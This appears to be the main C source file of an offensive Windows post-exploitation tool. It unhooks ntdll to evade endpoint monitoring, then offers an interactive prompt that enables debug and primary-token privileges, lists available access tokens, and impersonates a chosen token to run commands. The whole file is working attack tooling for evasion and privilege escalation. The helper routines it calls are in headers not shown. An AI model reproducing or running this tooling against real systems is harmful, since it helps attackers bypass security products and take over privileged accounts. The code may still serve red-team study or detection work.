#include <stdio.h>
#include <Windows.h>
#include <minwindef.h>
#include <winternl.h>

#include "unhook.h"
#include "systeminfo.h"
#include "token.h"
#include "syscalls.h"
#include "privileges.h"

typedef unsigned long DWORD;

#define MAX_COMMAND_BUFFER_LEN 256
#define PROMPT "\n# "

int main()
{
    int should_exit = FALSE;

    printf("[*] Unhooking ntdll...\n");
    unhookNtdll();
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    if (!print_version(hNtdll))
    {
        return 1;
    }

    while (!should_exit)
    {
        printf(PROMPT);
        char command_buf[MAX_COMMAND_BUFFER_LEN];

        scanf_s("%255s", &command_buf, MAX_COMMAND_BUFFER_LEN);

        if (strcmp(command_buf, "exit") == 0)
        {
            should_exit = TRUE;
        }

        // ------------------------------------------------------------------------------------------------------------------
        // Priv Module 

        else if (strcmp(command_buf, "priv.debug") == 0)
        {
            enable_privilege(SE_DEBUG_NAME);
        }

        else if (strcmp(command_buf, "priv.assign") == 0)
        {
            enable_privilege(SE_ASSIGNPRIMARYTOKEN_NAME);
        }

        // ------------------------------------------------------------------------------------------------------------------
        // Token Module

        else if (strcmp(command_buf, "token.current") == 0)
        {
            EXTENDED_NAME_FORMAT eNameDisplay = NameFullyQualifiedDN;
            const DWORD Len = 1024;
            TCHAR szUsername[Len + 1];
            DWORD dwLen = Len;
            if (GetUserNameEx(eNameDisplay, szUsername, &dwLen))
            {
                _stprintf("%s", szUsername);
            }
            /*
            HANDLE currentToken;
            OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &currentToken);
            Token* t = new Token;
            t->tokenHandle = currentToken;
            get_token_information(t);
            printf("%ws\n", t->tokenUsername);*/
        }
        else if (strcmp(command_buf, "token.list") == 0)
        {
            Token* availableTokens[1024];
            list_available_tokens(hNtdll, availableTokens);
        }
        else if (strcmp(command_buf, "token.use") == 0)
        {
            if (!enable_privilege(SE_IMPERSONATE_NAME))
            {
                printf("[!] SeImpersonatePrivilege is needed for token impersonation");
                continue;
            }

            Token* availableTokens[1024];
            list_available_tokens(hNtdll, availableTokens);

            printf("Enter token ID to use: ");

            int token_id;
            scanf_s("%d", &token_id);
            printf("\n"); 

            Token* tokenToUse = availableTokens[token_id];

            run_cmd_with_token(tokenToUse);
        }

        // ------------------------------------------------------------------------------------------------------------------

        else
        {
            printf("[!] Command not recognized.\n\n");
            printf("[i] Commands available:\n");
            printf("\tpriv.debug\n");
            printf("\tpriv.assign\n");
            printf("\ttoken.current\n");
            printf("\ttoken.list\n");
            printf("\ttoken.use\n");
            printf("\texit\n");
        }
    }

    return 0;
}
